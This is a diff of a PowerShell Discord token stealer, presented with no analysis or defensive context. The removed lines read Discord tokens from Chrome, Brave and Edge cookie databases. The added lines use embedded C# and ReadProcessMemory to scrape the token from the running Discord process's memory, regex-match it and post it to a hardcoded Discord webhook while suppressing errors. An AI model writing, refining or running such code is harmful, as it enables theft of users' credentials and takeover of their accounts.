@@ -1,26 +1,46 @@
 $webhookUrl = "https://discord.com/api/webhooks/1508519789566496950/B3L__pijUlyH20EfneD3XeA2CwwzCw0HteEze4taaUyxD1txNgPF2BwVXgeJzG-3Ifme"
-Add-Type -AssemblyName System.Web
 
-$cookiePaths = @(
-    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
-    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies",
-    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
-)
-
-foreach ($cookiePath in $cookiePaths) {
-    if (Test-Path $cookiePath) {
-        Copy-Item $cookiePath "$env:TEMP\cookies_copy.sqlite" -Force
-        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$env:TEMP\cookies_copy.sqlite")
-        $conn.Open()
-        $cmd = $conn.CreateCommand()
-        $cmd.CommandText = "SELECT value FROM cookies WHERE host_key LIKE '%discord%' AND name = 'token'"
-        $reader = $cmd.ExecuteReader()
-        while ($reader.Read()) {
-            $token = $reader.GetString(0)
-            $payload = @{content = "**Cookie Token:** $token"} | ConvertTo-Json
-            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Text;
+public class MemoryReader {
+    [DllImport("kernel32.dll")]
+    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+    [DllImport("kernel32.dll")]
+    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+    [DllImport("kernel32.dll")]
+    static extern bool CloseHandle(IntPtr hObject);
+    const uint PROCESS_VM_READ = 0x0010;
+    const uint PROCESS_QUERY_INFORMATION = 0x0400;
+    
+    public static string FindToken(int pid) {
+        IntPtr handle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid);
+        if (handle == IntPtr.Zero) return null;
+        for (int i = 0; i < 0x400000; i += 1024) {
+            byte[] buffer = new byte[1024];
+            IntPtr bytesRead;
+            if (ReadProcessMemory(handle, (IntPtr)i, buffer, 1024, out bytesRead)) {
+                string str = Encoding.UTF8.GetString(buffer);
+                var match = System.Text.RegularExpressions.Regex.Match(str, @"[\w-]{24,28}\.[\w-]{6,7}\.[\w-]{27,38}");
+                if (match.Success) {
+                    CloseHandle(handle);
+                    return match.Value;
+                }
+            }
         }
-        $conn.Close()
-        Remove-Item "$env:TEMP\cookies_copy.sqlite" -Force
+        CloseHandle(handle);
+        return null;
+    }
+}
+"@ -ReferencedAssemblies "System.Runtime.InteropServices"
+
+$discordProcess = Get-Process -Name "Discord" -ErrorAction SilentlyContinue
+if ($discordProcess) {
+    $token = [MemoryReader]::FindToken($discordProcess.Id)
+    if ($token) {
+        $payload = @{content = "Discord Token: `n$token"} | ConvertTo-Json
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
     }
 }
